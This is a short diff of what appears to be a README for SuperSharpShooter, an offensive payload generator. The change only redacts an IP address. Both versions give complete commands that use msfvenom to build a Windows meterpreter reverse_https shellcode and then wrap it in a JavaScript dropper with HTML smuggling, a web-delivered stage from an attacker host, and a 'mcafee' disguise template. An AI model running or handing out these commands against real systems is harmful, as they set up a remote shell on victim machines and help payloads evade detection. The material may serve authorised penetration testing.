@@ -9,9 +9,9 @@ cd SuperSharpShooter
 
 docker build -t super-sharp-shooter .
 
-msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.215 LPORT=443 EnableStageEncoding=True PrependMigrate=True -f csharp | sed '1s/^[^{]*{//; $s/}.*$//' > csharpsc.txt
+msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=192.168.x.x LPORT=443 EnableStageEncoding=True PrependMigrate=True -f csharp | sed '1s/^[^{]*{//; $s/}.*$//' > csharpsc.txt
 
-docker run --rm -it -v "$(pwd)":/app/ super-sharp-shooter --payload js --dotnetver 4 --scfile ./csharpsc.txt --output hoge --delivery web --web http://192.168.45.215/hoge.payload --smuggle --template mcafee --shellcode
+docker run --rm -it -v "$(pwd)":/app/ super-sharp-shooter --payload js --dotnetver 4 --scfile ./csharpsc.txt --output hoge --delivery web --web http://192.168.x.x/hoge.payload --smuggle --template mcafee --shellcode
 ```
 
 
